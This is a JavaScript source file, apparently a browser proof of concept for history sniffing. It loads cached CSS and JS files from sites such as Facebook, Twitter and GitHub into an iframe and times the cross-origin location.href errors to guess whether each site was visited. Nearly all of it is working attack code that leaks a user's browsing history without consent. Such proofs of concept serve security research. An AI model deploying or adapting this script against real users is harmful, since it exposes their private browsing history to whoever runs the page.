
/****************
 * SCANNED URLS *
 ****************/

$(function() {
  window.targets = $('#apps').data('sites');
})

// var targets = [
//   { 'name': 'Facebook', 'urls': ['https://fbstatic-a.akamaihd.net/rsrc.php/v2/yf/r/wFSNrk6UZBA.css'] },

//   { 'name': 'Twitter', 'urls': ['https://abs.twimg.com/a/1440364555/css/t1/twitter_core.bundle.css'] },

//   { 'name': 'Time.gov', 'urls': ['http://www.time.gov/lps/includes/embed-compressed.js', 'http://www.time.gov/nist_time.lzx.js'] },

//   { 'name': 'GitHub', 'urls': ['hhttps://assets-cdn.github.com/assets/github2/index-9f11074052a3551cd7bae2fba8b949844d2d7329927a7f1cb5a2c2a821f016e0.css'] },

//   { 'name': 'This American Life', 'urls': ['http://www.thisamericanlife.org/sites/default/files/js/js_8616ee480b34739f5bdf8d18679e22fe.js'] }
// ];

/*************************
 * CONFIGURABLE SETTINGS *
 *************************/

var TIME_LIMIT = 2; /* used to be 2 */
var MAX_ATTEMPTS = 1;

/**********************
 * MAIN STATE MACHINE *
 **********************/

var log_area;

var target_num = 0;
var attempt = 0;
var confirmed_visited = false;

var current_url, current_name;
var wait_cycles;

var frame_ready = false;
var urls;

/* The frame points to about:blank. Initialize a new test, giving the
   about:blank frame some time to fully load. */

function perform_check() {
  console.log("perform_check");
  wait_cycles = 0;
  setTimeout(wait_for_read1, 1);
}

/* Confirm that about:blank is loaded correctly. */

function wait_for_read1() {
  console.log("wfr1. wc= " + wait_cycles);
  if (wait_cycles++ > 100) {
    alert('Something went wrong, sorry.');
    return;
  }

  try {
    console.log('location.href= ' + frames['f'].location.href);
    if (frames['f'].location.href != 'about:blank') throw 1;
    frames['f'].stop();
    $('#f')[0].src ='javascript:"<body onload=\'parent.frame_ready = true\'>"';
    console.log('frame_ready= ' + frame_ready);
    setTimeout(wait_for_read2, 1);
  } catch (e) {
    setTimeout(wait_for_read1, 1);
  }

}

function wait_for_read2() {
  console.log("wfr2. wc= " + wait_cycles);
  if (wait_cycles++ > 100) {
    alert('Something went wrong, sorry.');
    return;
  }

  if (!frame_ready) {
    setTimeout(wait_for_read2, 1);
  } else {
    frames['f'].stop();
    setTimeout(navigate_to_target, 1);
  }

}

/* Navigate the frame to the target URL. */

function navigate_to_target() {
  console.log("navigate_to_target");
  cycles = 0;
  setTimeout(wait_for_noread, 1);
  urls++;
  $('#f')[0].src = current_url;

}

function wait_for_noread() {
  console.log("wait_for_noread. cycle= " + cycles);
  try {

    /* This is where SOP violation is happening, because we're trying to
    read location.href property of a cross-origin resource loaded into
    an IFrame. */

    if (frames['f'].location.href == undefined) throw 1;

    /* Until TIME_LIMIT reached, keep trying to read location.href
    from IFrame. If we get SOP error, that page was cached/visited before.
    If not, we've probably not visited the page. Either way, abort pending
    navigation by calling maybe_test_next() and pointing the IFrame src back
    to about:blank when done, preventing full resource loading and alteration
    of cache. Then move to next site. */

    if (cycles++ >= TIME_LIMIT) {
      maybe_test_next();
      return;
    }

    setTimeout(wait_for_noread, 1);

  } catch (e) {
    confirmed_visited = true;
    maybe_test_next();
  }
}

/* Just a logging helper. */

function log_text(str, type, cssclass) {
  var el = document.createElement(type);
  var tx = document.createTextNode(str);

  el.className = cssclass;
  el.appendChild(tx);

  log_area.appendChild(el);
}


/* Decides what to do next. May schedule another attempt for
the same target, select a new target, or wrap up the scan. */

function maybe_test_next() {
  console.log("maybe_test_next. target_num= " + target_num);
  frame_ready = false;
  $('#f')[0].src = 'about:blank'; // stop any page loads

  if (target_num < targets.length) {

    if (confirmed_visited) {
      log_text('Visited: ' + current_name + ' [' + cycles + ':' + attempt + ']', 'li', 'visited');
    }

    if (confirmed_visited || attempt == MAX_ATTEMPTS * targets[target_num].urls.length) {

      if (!confirmed_visited)
        log_text('Not visited: ' + current_name + ' [' + cycles + '+]', 'li', 'not_visited');

      confirmed_visited = false;
      target_num++;
      attempt = 0;
      maybe_test_next();

    } else {

      current_url = targets[target_num].urls[attempt % targets[target_num].urls.length];
      current_name = targets[target_num].name;
      attempt++;
      console.log('current name= ' + current_name);
      console.log('current url= ' + current_url);
      perform_check();
    }

  } else {

    end_time = (new Date()).getTime();
    $('#status')[0].innerHTML = 'Tested ' + urls + ' individual URLs in ' + (end_time - start_time) + ' ms.';
    $('#btn')[0].disabled = false;
  }
}


/* The handler for "run the test" button on the main page. Dispenses advice, resets state if necessary. */

function start_stuff() {

  if (navigator.userAgent.indexOf('Chrome/') == -1 &&
      navigator.userAgent.indexOf('Opera/') == -1) {

    alert('This proof-of-concept is specific to Chrome and Opera, and probably won\'t work for you.\n\n' +
          'Versions for other browsers can be found here:\n' +
          'http://lcamtuf.coredump.cx/cachetime/');

  }

  target_num = 0;
  attempt = 0;
  confirmed_visited = false;

  $('#btn')[0].disabled = true;

  log_area = $('#log')[0];
  log_area.innerHTML = '';

  start_time = (new Date()).getTime();
  urls = 0;

  maybe_test_next();

}